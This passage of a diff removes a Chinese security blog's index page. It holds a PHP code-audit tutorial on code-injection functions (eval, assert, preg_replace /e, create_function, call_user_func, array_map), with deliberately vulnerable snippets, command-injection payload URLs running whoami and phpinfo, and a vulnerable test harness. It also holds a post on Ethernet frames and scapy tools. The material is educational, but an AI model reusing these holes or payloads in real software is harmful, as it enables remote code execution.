字符&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;
-&lt;/span&gt;&apos;);
-    }
-
-    $result = shell_exec($servercmd . &apos; &apos; . $cmds);
-    echo &apos;shell_exec output: &lt;br&gt;&apos;;
-    echo $result;
-    echo &apos;&lt;br&gt;&lt;br&gt;&lt;br&gt;&apos;;
-
-    echo &apos;----------------------------------------------------------&lt;br&gt;&apos;;
-
-    echo &apos;system output: &lt;br&gt;&apos;;
-    system($servercmd . &apos; &apos; . $cmds, $code);
-
-    echo &apos;&lt;br&gt;&lt;br&gt;&lt;br&gt;system return code: &apos;;
-    echo $code;
-    echo &apos;&lt;br&gt;&lt;br&gt;&lt;br&gt;&apos;;
-
-    echo &apos;----------------------------------------------------------&lt;br&gt;&apos;;
-
-    exec($servercmd . &apos; &apos; . $cmds, $a, $code2);
-    echo &apos;exec output:&lt;br&gt;&apos;;
-
-    foreach ($a as $aa) {
-    echo $aa;
-    }
-
-
-    echo &apos;&lt;br&gt;&lt;br&gt;&lt;br&gt;exec return code:&apos; . $code2;
-    echo &apos;&lt;br&gt;&lt;br&gt;&lt;br&gt;&apos;;
-
-    echo &apos;----------------------------------------------------------&lt;br&gt;&apos;;
-
-    echo &apos;passthru output:&lt;br&gt;&apos;;
-    passthru($servercmd . &apos; &apos; . $cmds, $code3);
-
-    echo &apos;&lt;br&gt;&lt;br&gt;&lt;br&gt;passthru return code: &apos;;
-    echo $code3;
-    echo &apos;&lt;br&gt;&lt;br&gt;&lt;br&gt;&apos;;
-
-    echo &apos;----------------------------------------------------------&lt;br&gt;&apos;;
-
-    echo &quot;the string is:&lt;br&gt;&quot; . $cmds;
-
-    ?&gt;
-&lt;/div&gt;
-&lt;/body&gt;
-
-&lt;/html&gt;
-</code></pre>
-        
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-          <div class="post-eof"></div>
-        
-      </footer>
-  </div>
-  
-  
-  
-  </article>
-
-    
-        <article itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block home">
-    <link itemprop="mainEntityOfPage" href="http://hl0rey.github.io/2018/02/19/代码审计之代码执行/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="博主">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/avatar.gif">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="hl0rey's blog">
-    </span>
-      <header class="post-header">
-        <h1 class="post-title" itemprop="name headline">
-            
-            <a href="/2018/02/19/代码审计之代码执行/" class="post-title-link" itemprop="url">代码审计之代码执行</a>
-          
-        </h1>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-
-              
-                
-              
-
-              <time title="创建于：2018-02-19 15:34:35 / 更新于：18:15:21" itemprop="dateCreated datePublished" datetime="2018-02-19T15:34:35+08:00">2018-02-19</time>
-            </span>
-          
-            
-
-            
-          
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/code/" itemprop="url" rel="index"><span itemprop="name">code</span></a></span>
-
-                
-                
-              
-            </span>
-          
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <pre><code>为了让程序更加灵活，能够迎合复杂的需求。常常需要程序可以动态执行代码。当在动态执行的代码可以控制的时候，则很可能出现代码执行（代码注入）漏洞。
-</code></pre><h3 id="动态执行代码的情况"><a href="#动态执行代码的情况" class="headerlink" title="动态执行代码的情况"></a>动态执行代码的情况</h3><ul>
-<li><p>直接执行代码的函数</p>
-<pre><code>eval
-assert
-preg_replace
-</code></pre></li>
-<li><p>回调函数</p>
-<pre><code>call_usr_func
-call_usr_func_array
-array_map
-</code></pre></li>
-<li><p>函数动态执行</p>
-<pre><code>$a($b)
-</code></pre></li>
-</ul>
-<h3 id="具体分析："><a href="#具体分析：" class="headerlink" title="具体分析："></a>具体分析：</h3><h4 id="一、直接代码执行的函数"><a href="#一、直接代码执行的函数" class="headerlink" title="一、直接代码执行的函数"></a>一、直接代码执行的函数</h4><p>1.eval()：<br><a href="http://php.net/eval" target="_blank" rel="noopener">http://php.net/eval</a></p>
-<pre><code>eval($a)
-</code></pre><p>字符串a带入就可以执行，这个太容易利用了<br>值得一提的是eval不能被可变函数调用</p>
-<p>2.assert()：<br><a href="http://php.net/manual/zh/function.assert.php" target="_blank" rel="noopener">http://php.net/manual/zh/function.assert.php</a></p>
-<pre><code>assert($a)
-</code></pre><p>参数a是个字符串，assert函数会把他当作代码执行</p>
-<p>3.preg_replace() php5.5之前可用<br><a href="http://php.net/manual/zh/function.preg-replace.php" target="_blank" rel="noopener">http://php.net/manual/zh/function.preg-replace.php</a></p>
-<pre><code>mixed preg_replace ( mixed $pattern , mixed $replacement , mixed $subject [, int $limit = -1 [, int &amp;$count ]] )
-</code></pre><p>简化一下</p>
-<pre><code>preg_replace($a,$b,$c)
-</code></pre><p>参数 a、b、c可以是字符串也可以是数组，此处参数a、b、c可以注入<br>a）参数a注入是构造字符串使参数a含有“/e”，并且参数b在反向引用结束之后符合eval语法。也就是这个过程，用正则a去匹配c，得到捕获组，然后反向引用取到捕获组的内容，如果此时的字符串符合eval语法，就代码执行了。下面这两篇文章是介绍反向引用的<br><a href="http://blog.csdn.net/lxcnn/article/details/4146148" target="_blank" rel="noopener">http://blog.csdn.net/lxcnn/article/details/4146148</a><br><a href="http://www.cnblogs.com/-ShiL/archive/2012/04/06/Star201204061009.html" target="_blank" rel="noopener">http://www.cnblogs.com/-ShiL/archive/2012/04/06/Star201204061009.html</a></p>
-<ul>
-<li><p>示例：<br>php代码：</p>
-<pre><code>&lt;?php preg_replace($_GET[‘reg’],”\\1”,”ph1phpinfoph1”);?&gt;
-</code></pre></li>
-</ul>
-<p>payload：<br>www.test.com/test.php?reg=/ph1(.*?)ph1/e</p>
-<p>b)参数b注入就十分简单了，但是必须正则a使用了e修饰符，直接穿传符合eval语法的字符串就行了<br>示例：<br>php代码：</p>
-<pre><code>&lt;?php preg_replace(“/test/e”,$_GET[‘cmd’],”test”);?&gt;
-</code></pre><p>payload：<br>www.test.com/test.php?cmd=phpinfo()<br>c）参数c的注入跟参数a类似，只要让参数b取得的字符串符合eval语法就行了。<br>示例：<br>php代码：</p>
-<pre><code>&lt;?php preg_replace(“/ph1(.*?)php/e”,”\\1”,$_GET[‘cmd’]);?&gt;
-</code></pre><p>payload:<br>www.test.com/test.php?cmd=ph1phpinfo()ph1<br>`    </p>
-<p>4.create_function()<br><a href="http://php.net/manual/zh/function.create-function.php" target="_blank" rel="noopener">http://php.net/manual/zh/function.create-function.php</a></p>
-<pre><code>string create_function ( string $args , string $code )
-create_function($a,$b)
-</code></pre><p>这个函数在内部执行的eval，也就是说解析传入的参数，构造一段创建函数的符合eval语法的字符串，然后直接执行他。这里的参数b可以注入代码。<br>示例：<br>php代码：</p>
-<pre><code>&lt;?php
-//02-8.php?id=2;}phpinfo();/*
-$id=$_GET[&apos;id&apos;];
-$str2=&apos;echo  ‘.$a.’ test&apos;.$id.&quot;;&quot;;
-echo $str2;
-echo &quot;&lt;br/&gt;&quot;;
-echo &quot;==============================&quot;;
-echo &quot;&lt;br/&gt;&quot;;
-$f1 = create_function(&apos;$a&apos;,$str2);
-echo &quot;&lt;br/&gt;&quot;;
-echo &quot;==============================&quot;;
-?&gt;
-</code></pre><p>payload:<br><a href="http://127.0.0.1/test.php?id=2;}phpinfo();/*" target="_blank" rel="noopener">http://127.0.0.1/test.php?id=2;}phpinfo();/*</a><br>绕过一下<br><a href="http://127.0.0.1/test.php?id=;}@phpinfo();/*" target="_blank" rel="noopener">http://127.0.0.1/test.php?id=;}@phpinfo();/*</a></p>
-<p>原本字符串：<br>    function fT($a) {<br>      echo “test”.$a;<br>    }</p>
-<p>注入后字符串：</p>
-<pre><code>function fT($a) {
-  echo &quot;test&quot;;}
-  phpinfo();/*;//此处为注入代码。
-}
-
-&lt;?php
-$foobar = $_GET[&apos;foobar&apos;];
-$dyn_func = create_function(&apos;$foobar&apos;, &quot;echo $foobar;&quot;);
-$dyn_func(&apos;&apos;);
-?&gt;
-</code></pre><p>我们提交 <a href="http://127.0.0.1/create_function.php?foobar=system%28dir%29" target="_blank" rel="noopener">http://127.0.0.1/create_function.php?foobar=system%28dir%29</a> 执行dir命令</p>
-<p>5.call_user_func()<br><a href="http://php.net/manual/zh/function.call-user-func.php" target="_blank" rel="noopener">http://php.net/manual/zh/function.call-user-func.php</a></p>
-<pre><code>mixed call_user_func ( callable $callback [, mixed $parameter [, mixed $... ]] )
-call_user_func($a)
-</code></pre><p>参数a是调用的函数名，想办法让这里变成自己想要的函数名,如果还要个参数可控就更好了</p>
-<p>示例：<br>php代码：</p>
-<pre><code>&lt;?php call_user_func($_GET[‘code’]);?&gt;
-&lt;?php call_user_func($_GET[‘code’],$_GET[‘cmd’]);?&gt;
-</code></pre><p>payload：<br>www.test.com/test.php?code=phpinfo<br><a href="http://127.0.0.1/test.php?code=system&amp;cmd=whoami" target="_blank" rel="noopener">http://127.0.0.1/test.php?code=system&amp;cmd=whoami</a></p>
-<p>6.call_user_func_array()<br><a href="http://php.net/manual/zh/function.call-user-func-array.php" target="_blank" rel="noopener">http://php.net/manual/zh/function.call-user-func-array.php</a></p>
-<pre><code>mixed call_user_func_array ( callable $callback , array $param_arr )
-call_user_func_array($a,$b)
-</code></pre><p>跟call_user_func差不多，但是这个必须带参数。<br>127.0.0.1/test.php?func=phpinfo&amp;p[]= 此处为空不能执行<br>php代码：</p>
-<pre><code>&lt;?php call_user_func_array($_GET[&apos;func&apos;],$_GET[&apos;p&apos;]);?&gt;
-</code></pre><p>payload:<br><a href="http://127.0.0.1/test.php?func=system&amp;p[]=whoami" target="_blank" rel="noopener">http://127.0.0.1/test.php?func=system&amp;p[]=whoami</a></p>
-<p>7.ob_start() php7未测试成功<br><a href="http://php.net/manual/zh/function.ob-start.php" target="_blank" rel="noopener">http://php.net/manual/zh/function.ob-start.php</a></p>
-<pre><code>bool ob_start ([ callback $output_callback [, int $chunk_size [, bool $erase ]]] )
-ob_start($a)
-</code></pre><p>参数a是一个回调函数名，当缓存刷新时，把缓冲区的内容作为一个参数传给回    调函数处理，回调函数内不能再调用ob_start().</p>
-<pre><code>$foobar = &apos;system&apos;;
-ob_start($foobar);
-echo &apos;dir&apos;;
-ob_end_flush();
-</code></pre><p>8.array_map()<br><a href="http://php.net/manual/zh/function.array-map.php" target="_blank" rel="noopener">http://php.net/manual/zh/function.array-map.php</a></p>
-<p>array array_map ( callable $callback , array $array1 [, array $… ] )<br>示例：</p>
-<pre><code>&lt;?php array_map(&apos;system&apos;,$_GET[&apos;cmd&apos;]);?&gt;
-</code></pre><p><a href="http://127.0.0.1/test.php?cmd[]=whoami" target="_blank" rel="noopener">http://127.0.0.1/test.php?cmd[]=whoami</a></p>
-<p>9.array_walk(),array_walk_recursive()<br><a href="http://php.net/manual/zh/function.array-walk.php" target="_blank" rel="noopener">http://php.net/manual/zh/function.array-walk.php</a><br><a href="http://php.net/manual/zh/function.array-walk-recursive.php" target="_blank" rel="noopener">http://php.net/manual/zh/function.array-walk-recursive.php</a><br>bool array_walk ( array &amp;$array , callable $callback [, mixed $userdata = NULL ] )<br>bool array_walk_recursive ( array &amp;$array , callable $callback [, mixed $userdata = NULL ] )<br>array_walk($a,$b)<br>array_walk_recursive($a,$b)<br>参数a是个数组，参数b是个回调函数的名字，这两个函数都是把数组中的值作为参数带到回调函数中执行。第二个可以遍历多维数组。</p>
-<pre><code>&lt;？php array_walk($_GET[&apos;cmd&apos;],&apos;system&apos;);
-array_walk_recursive($_GET[&apos;cmd&apos;],&apos;system&apos;); ?&gt;
-</code></pre><p><a href="http://127.0.0.1/test.php?cmd[]=whoami" target="_blank" rel="noopener">http://127.0.0.1/test.php?cmd[]=whoami</a></p>
-<p>10.register_shutdown_function()<br><a href="http://php.net/manual/zh/function.register-shutdown-function.php" target="_blank" rel="noopener">http://php.net/manual/zh/function.register-shutdown-function.php</a></p>
-<pre><code>void register_shutdown_function ( callable $callback [, mixed $parameter [, mixed $... ]] )
-</code></pre><p>register_shutdown_function($a)<br>参数a是一个函数名，也可以给他传参,可以传多个<br>register_shutdown_function($a,$b)<br>示例</p>
-<pre><code>&lt;?php register_shutdown_function(&apos;system&apos;,$_GET[&apos;cmd&apos;]);?&gt;
-</code></pre><p><a href="http://127.0.0.1/test.php?cmd=whoami" target="_blank" rel="noopener">http://127.0.0.1/test.php?cmd=whoami</a></p>
-<pre><code>&lt;?php register_shutdown_function($_GET[&apos;cmd&apos;]);?&gt;
-</code></pre><p><a href="http://127.0.0.1/test.php?cmd=phpinfo" target="_blank" rel="noopener">http://127.0.0.1/test.php?cmd=phpinfo</a></p>
-<p>11.preg_replace_callback(),preg_replace_callback_array<br><a href="http://php.net/manual/zh/function.preg-replace-callback.php" target="_blank" rel="noopener">http://php.net/manual/zh/function.preg-replace-callback.php</a></p>
-<pre><code>mixed preg_replace_callback ( mixed $pattern , callable $callback , mixed $subject [, int $limit = -1 [, int &amp;$count ]] )
-http://php.net/manual/zh/function.preg-replace-callback-array.php
-mixed preg_replace_callback_array ( array $patterns_and_callbacks , mixed $subject [, int $limit = -1 [, int &amp;$count ]] )
-</code></pre><p>这个函数太麻烦先算了。</p>
-<p>13.array_filter()<br><a href="http://php.net/manual/zh/function.array-filter.php" target="_blank" rel="noopener">http://php.net/manual/zh/function.array-filter.php</a></p>
-<pre><code>array array_filter ( array $array [, callable $callback [, int $flag = 0 ]] )
-</code></pre><p><a href="http://php.net/manual/zh/function.array-reduce.php" target="_blank" rel="noopener">http://php.net/manual/zh/function.array-reduce.php</a></p>
-<pre><code>mixed array_reduce ( array $array , callable $callback [, mixed $initial = NULL ] )这俩跟array_walk()执行代码的方式一样
-</code></pre><p>14.stream_filter_register()<br><a href="http://php.net/manual/zh/function.stream-filter-register.php" target="_blank" rel="noopener">http://php.net/manual/zh/function.stream-filter-register.php</a><br>自己构造一个类贼六啊<br>15.剩下的可能执行代码的函数<br>回调函数的构造比较复杂，当遇上的时候再具体分析。</p>
-<pre><code>xml_set_character_data_handler()
-xml_set_default_handler()
-xml_set_element_handler()
-xml_set_end_namespace_decl_handler()
-xml_set_external_entity_ref_handler()
-xml_set_notation_decl_handler()
-xml_set_processing_instruction_handler()
-xml_set_start_namespace_decl_handler()
-xml_set_unparsed_entity_decl_handler()
-stream_filter_register()
-set_error_handler()
-usort(),uasort(), uksort()array_diff_uassoc(),
-array_diff_ukey()
-array_udiff(), array_udiff_assoc(), array_udiff_uassoc()
-array_intersect_assoc(), array_intersect_uassoc()
-array_uintersect(), array_uintersect_assoc(), array_uintersect_uassoc()
-</code></pre><p>16.这个没看懂怎么注入代码，比较反人类</p>
-<pre><code>register_tick_function()
-</code></pre><h1 id="危险函数集合"><a href="#危险函数集合" class="headerlink" title="危险函数集合"></a>危险函数集合</h1><pre><code>直接执行代码
-eval()
-assert()
-preg_replace()(php7不支持.5.5以后废弃改成preg_replace _callback(）
-
-可以控制函数内容
-create_function()
-
-能控制函数参数和函数名
-较容易
-call_user_func（），call_user_func_array（）
-ob_start()，
-array_map()，array_walk(),array_walk_recursive()
-register_shutdown_function()
-preg_replace _callback()
-array_filter()
-array_reduce()
-
-
-比较困难，参数可控但是有限制
-xml_set_character_data_handler()
-xml_set_default_handler()
-xml_set_element_handler()
-xml_set_end_namespace_decl_handler()
-xml_set_external_entity_ref_handler()
-xml_set_notation_decl_handler()
-xml_set_processing_instruction_handler()
-xml_set_start_namespace_decl_handler()
-xml_set_unparsed_entity_decl_handler()
-
-stream_filter_register()
-
-set_error_handler()
-
-usort(),uasort(), uksort()array_diff_uassoc(),
-array_diff_ukey()
-array_udiff(), array_udiff_assoc(), array_udiff_uassoc()
-array_intersect_assoc(), array_intersect_uassoc()
-array_uintersect(), array_uintersect_assoc(), array_uintersect_uassoc()
-
-register_tick_function()
-</code></pre><h3 id="测试代码"><a href="#测试代码" class="headerlink" title="测试代码"></a>测试代码</h3><pre><code>&lt;?php
-
-//36个函数或者语句可以代码执行
-//代码执行函数 eval，assert,preg_replace(php7不支持.5.5以后废弃),create_function,ob_start()
-
-//assert http://php.net/manual/zh/function.assert.php https://yq.aliyun.com/articles/27402
-//preg_replace http://php.net/manual/zh/function.preg-replace.php https://zhidao.baidu.com/question/240565568.html
-//ob_start http://blog.csdn.net/qq_22533095/article/details/50372150
-
-
-/*
- * 同类型函数还有很多
-array_map()
-usort(), uasort(), uksort()
-array_filter()
-array_reduce()
-array_diff_uassoc(), array_diff_ukey()
-array_udiff(), array_udiff_assoc(), array_udiff_uassoc()
-array_intersect_assoc(), array_intersect_uassoc()
-array_uintersect(), array_uintersect_assoc(), array_uintersect_uassoc()
-array_walk(), array_walk_recursive()
-xml_set_character_data_handler()
-xml_set_default_handler()
-xml_set_element_handler()
-xml_set_end_namespace_decl_handler()
-xml_set_external_entity_ref_handler()
-xml_set_notation_decl_handler()
-xml_set_processing_instruction_handler()
-xml_set_start_namespace_decl_handler()
-xml_set_unparsed_entity_decl_handler()
-stream_filter_register()
-set_error_handler()
-register_shutdown_function()
-register_tick_function()
- * */
-
-
-$codes = &apos;&apos;;
-$original = &apos;eval&apos;;
-
-if ($_POST[&apos;lv&apos;] == 1) {
-
-    $codes = $_POST[&apos;code&apos;];
-
-}
-
-if (isset($_POST[&apos;func&apos;])) {
-    $original = str_replace(&apos; &apos;, &apos;&apos;, $_POST[&apos;func&apos;]);
-}
-
-
-if ($original == &apos;eval&apos;) {
-
-    eval(&apos;echo &apos; . $codes);
-
-}
-if ($original == &apos;assert&apos;) {
-
-    assert(&apos;1=&apos; . $codes);
-
-
-}
-
-if ($original == &apos;create_function&apos;) {
-    $func = create_function(&apos;$a&apos;, &apos;echo $a&apos;);
-    $func($codes);
-}
-
-if ($original == &apos;dynamic&apos;) {
-
-    $codes();
-
-}
-
-if ($original == &apos;preg_replace&apos;) {
-    function test($a){
-    echo $a;
-    }
-    //echo preg_replace(&quot;/\s*php(.+?)\/php\s*/ies&quot;, &quot;\\1&quot;, $_GET[&apos;h&apos;]);
-    echo preg_replace(&quot;/s*[php](.+?)[/php]s*/ies&quot;, &apos;test(&quot;\1&quot;)&apos;, $codes);
-}
-if ($original==&apos;ob_start&apos;){
-
-    ob_start($codes);
-    echo &apos;echo &quot;codeexec&quot;&apos;;
-    ob_end_flush();
-
-
-}
-
-if ($original==&apos;unserialize&apos;){
-
-    //此处应当另行探究，主要研究php，反序列化
-
-}
-</code></pre>
-        
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-          <div class="post-eof"></div>
-        
-      </footer>
-  </div>
-  
-  
-  
-  </article>
-
-    
-        <article itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block home">
-    <link itemprop="mainEntityOfPage" href="http://hl0rey.github.io/2018/02/18/以太网协议详解/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="博主">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/avatar.gif">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="hl0rey's blog">
-    </span>
-      <header class="post-header">
-        <h1 class="post-title" itemprop="name headline">
-            
-            <a href="/2018/02/18/以太网协议详解/" class="post-title-link" itemprop="url">以太网协议详解</a>
-          
-        </h1>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-
-              
-                
-              
-
-              <time title="创建于：2018-02-18 21:02:34" itemprop="dateCreated datePublished" datetime="2018-02-18T21:02:34+08:00">2018-02-18</time>
-            </span>
-          
-            
-
-            
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-calendar-check-o"></i>
-                </span>
-                <span class="post-meta-item-text">Bearbeitet am</span>
-                <time title="更新于：2018-02-21 22:11:40" itemprop="dateModified" datetime="2018-02-21T22:11:40+08:00">2018-02-21</time>
-              </span>
-            
-          
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/code/" itemprop="url" rel="index"><span itemprop="name">code</span></a></span>
-
-                
-                
-              
-            </span>
-          
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <p>参考链接<br><a href="http://blog.csdn.net/xiao628945/article/details/8006022" target="_blank" rel="noopener">http://blog.csdn.net/xiao628945/article/details/8006022</a></p>
-<h3 id="各协议在模型中的位置"><a href="#各协议在模型中的位置" class="headerlink" title="各协议在模型中的位置"></a>各协议在模型中的位置</h3><pre><code>TCP/IP: 
-网络接口层（链路层）：
-网络层： IP,ICMP,IGMP，【ARP,RARP】
-传输层：TCP ,UDP,UGP
-应用层：Telnet,FTP,SMTP,SNMP.
-
-OSI:
-物理层：EIA/TIA-232, EIA/TIA-499, V.35, V.24, RJ45, Ethernet, 802.3, 802.5, FDDI, NRZI, NRZ, B8ZS
-数据链路层：Frame Relay, HDLC, PPP, IEEE 802.3/802.2, FDDI, ATM,  IEEE 802.5/802.2
-网络层：IP，IPX，AppleTalk DDP，【ARP,RARP】
-传输层：TCP，UDP，SPX
-会话层：RPC,SQL,NFS,NetBIOS,names,AppleTalk,ASP,DECnet,SCP
-表示层:TIFF,GIF,JPEG,PICT,ASCII,EBCDIC,encryption,MPEG,MIDI,HTML
-应用层：FTP,WWW,Telnet,NFS,SMTP,Gateway,SNMP
-</code></pre><h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><pre><code>以太网协议中应用最广泛的是　Ethernet II　协议，也是 scapy 支持的协议．
-</code></pre><h3 id="数据包结构详解"><a href="#数据包结构详解" class="headerlink" title="数据包结构详解"></a>数据包结构详解</h3><p><img src="/2018/02/18/以太网协议详解/1.png" alt=""> </p>
-<ul>
-<li><p>包头结构</p>
-<pre><code>typedef struct ethdr //以太网包头14字节
-{
-unsigned char destination_mac[6];//目标MAC 6字节
-unsigned char source_mac[6];//源MAC 6字节
-unsigned short type;//后面的协议类型2字节 为0806表示后面跟的包为ARP包
-}ET_HEADER,*PETHDR; 
-</code></pre></li>
-<li><p>type字段的常见值及其意义<br><img src="/2018/02/18/以太网协议详解/2.png" alt=""> </p>
-<pre><code>Ethertype ( 十六进制 )   协议   
-0x0000 - 0x05DC   IEEE 802.3 长度   
-0x0101 – 0x01FF   实验   
-0x0600   XEROX NS IDP   
-0x0660 0x0661   DLOG   
-0x0800   网际协议（IP）   
-0x0801   X.75 Internet   
-0x0802   NBS Internet   
-0x0803   ECMA Internet   
-0x0804   Chaosnet   
-0x0805   X.25 Level 3   
-0x0806   地址解析协议（ARP ： Address Resolution Protocol）   
-0x0808   帧中继 ARP （Frame Relay ARP） [RFC1701]   
-0x6559   原始帧中继（Raw Frame Relay） [RFC1701]   
-0x8035   动态 DARP （DRARP：Dynamic RARP） 反向地址解析协议（RARP：Reverse Address Resolution Protocol）   
-0x8037   Novell Netware IPX   
-0x809B   EtherTalk   
-0x80D5   IBM SNA Services over Ethernet   
-0x 80F 3   AppleTalk 地址解析协议（AARP：AppleTalk Address Resolution Protocol）   
-0x8100   以太网自动保护开关（EAPS：Ethernet Automatic Protection Switching）   
-0x8137   因特网包交换（IPX：Internet Packet Exchange）   
-0x 814C   简单网络管理协议（SNMP：Simple Network Management Protocol）   
-0x86DD   网际协议v6 （IPv6，Internet Protocol version 6）   
-0x880B   点对点协议（PPP：Point-to-Point Protocol）   
-0x 880C   通用交换管理协议（GSMP：General Switch Management Protocol）   
-0x8847   多协议标签交换（单播） MPLS：Multi-Protocol Label Switching &lt;unicast&gt;）   
-0x8848   多协议标签交换（组播）（MPLS, Multi-Protocol Label Switching &lt;multicast&gt;）   
-0x8863   以太网上的 PPP（发现阶段）（PPPoE：PPP Over Ethernet &lt;Discovery Stage&gt;）   
-0x8864   以太网上的 PPP（PPP 会话阶段） （PPPoE，PPP Over Ethernet&lt;PPP Session Stage&gt;）   
-0x88BB   轻量级访问点协议（LWAPP：Light Weight Access Point Protocol）   
-0x88CC   链接层发现协议（LLDP：Link Layer Discovery Protocol）   
-0x8E88   局域网上的 EAP（EAPOL：EAP over LAN）   
-0x9000   配置测试协议（Loopback）   
-0x9100   VLAN 标签协议标识符（VLAN Tag Protocol Identifier）   
-0x9200   VLAN 标签协议标识符（VLAN Tag Protocol Identifier）   
-0xFFFF   保留
-</code></pre><h3 id="scapy"><a href="#scapy" class="headerlink" title="scapy"></a>scapy</h3><p>  执行 ls(Ether)，回显如下：</p>
-<p>  dst        : DestMACField         = (None) //目的MAC<br>  src        : SourceMACField       = (None)//源MAC<br>  type       : XShortEnumField      = (36864)//上层协议类型</p>
-</li>
-</ul>
-<pre><code>通常不用手动构造以太头
-</code></pre><h4 id="scapy的几个发包的方法"><a href="#scapy的几个发包的方法" class="headerlink" title="scapy的几个发包的方法"></a>scapy的几个发包的方法</h4><pre><code>send()方法在三层定义和发送数据包，也就是说，用户不用自己考虑路由（不用自己选接口），和以太头．
-
-    send(IP(dst=&quot;www.baidu.com&quot;)/ICMP())
-    .
-    Sent 1 packets.
-
-
-
-sendp()方法在二层定义和发送数据包，需要自己指定接口，和加上以太头．
-
-    sendp(Ether()/IP(dst=&quot;www.baidu.com&quot;)/ICMP(),iface=&quot;wlan0&quot;,loop=1,inter=0.2)
-
-    loop=1时循环发包，等于0时不循环．
-    inter是发包的秒数间隔
-
-sr()方法在三层发包，返回一个元组，
-
-    n [32]: i
-    Out[32]: 
-    (&lt;Results: TCP:0 UDP:0 ICMP:1 Other:0&gt;,
-     &lt;Unanswered: TCP:0 UDP:0 ICMP:0 Other:0&gt;)
-
-
-    In [36]: i[0].summary()
-    IP / ICMP 192.168.1.104 &gt; 111.13.100.92 echo-request 0 ==&gt; IP / ICMP 111.13.100.92 &gt; 192.168.1.104 echo-reply 0
-
-    In [37]: i[0].show
-    Out[37]: &lt;bound method PacketList.show of &lt;Results: TCP:0 UDP:0 ICMP:1 Other:0&gt;&gt;
-
-    In [38]: i[0].show()
-    0000 IP / ICMP 192.168.1.104 &gt; 111.13.100.92 echo-request 0 ==&gt; IP / ICMP 111.13.100.92 &gt; 192.168.1.104 echo-reply 0
-
-    In [39]: i[1].show()
-
-    In [40]: 
-
-sr1()方法，只返回一个相应包
-srp()方法在二层发包．
-</code></pre><h4 id="查看scapy内置的工具："><a href="#查看scapy内置的工具：" class="headerlink" title="查看scapy内置的工具："></a>查看scapy内置的工具：</h4><pre><code>lsc()
-
-回显：
-
-arpcachepoison      : 向目标机器ARP缓存投毒，指定一个这样的 (your MAC,victim&apos;s IP) 元组．
-arping              : 发送ARP who-has requests 来扫描存活主机
-bind_layers         : Bind 2 layers on some specific fields&apos; values
-bridge_and_sniff    : Forward traffic between two interfaces and sniff packets exchanged
-corrupt_bits        : Flip a given percentage or number of bits from bytes
-corrupt_bytes       : Corrupt a given percentage or number of bytes from bytes
-defrag              : defrag(plist) -&gt; ([not fragmented], [defragmented],
-defragment          : defragment(plist) -&gt; plist defragmented as much as possible 
-dyndns_add          : Send a DNS add message to a nameserver for &quot;name&quot; to have a new &quot;rdata&quot;
-dyndns_del          : Send a DNS delete message to a nameserver for &quot;name&quot;
-etherleak           : Exploit Etherleak flaw
-fragment            : Fragment a big IP datagram
-fuzz                : Transform a layer into a fuzzy layer by replacing some default values by random objects
-getmacbyip          : Return MAC address corresponding to a given IP address
-hexdiff             : Show differences between 2 binary strings
-hexdump             : --
-hexedit             : Run external hex editor on a packet or bytes. Set editor in conf.prog.hexedit
-is_private_addr     : Returns True if the IPv4 Address is an RFC 1918 private address.
-is_promisc          : Try to guess if target is in Promisc mode. The target is provided by its ip.
-linehexdump         : --
-ls                  : List  available layers, or infos on a given layer
-mtr                 : A Multi-Traceroute (mtr) command:
-promiscping         : Send ARP who-has requests to determine which hosts are in promiscuous mode
-rdpcap              : Read a pcap file and return a packet list
-send                : Send packets at layer 3
-sendp               : Send packets at layer 2
-sendpfast           : Send packets at layer 2 using tcpreplay for performance
-sniff               : Sniff packets
-split_layers        : Split 2 layers previously bound
-sr                  : Send and receive packets at layer 3
-sr1                 : Send packets at layer 3 and return only the first answer
-srbt                : send and receive using a bluetooth socket
-srbt1               : send and receive 1 packet using a bluetooth socket
-srflood             : Flood and receive packets at layer 3
-srloop              : Send a packet at layer 3 in loop and print the answer each time
-srp                 : Send and receive packets at layer 2
-srp1                : Send and receive packets at layer 2 and return only the first answer
-srpflood            : Flood and receive packets at layer 2
-srploop             : Send a packet at layer 2 in loop and print the answer each time
-tdecode             : Run tshark to decode and display the packet. If no args defined uses -V
-traceroute          : Instant TCP traceroute
-tshark              : Sniff packets and print them calling pkt.show(), a bit like text wireshark
-wireshark           : Run wireshark on a list of packets
-wrpcap              : Write a list of packets to a pcap file
-</code></pre><p>值得一提的是srbt那一堆方法．        </p>
-
-        
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-          <div class="post-eof"></div>
-        
-      </footer>
-  </div>
-  
-  
-  
-  </article>
-
-    
-        <article itemscope itemtype="http://schema.org/Article">
-  
-  
-  
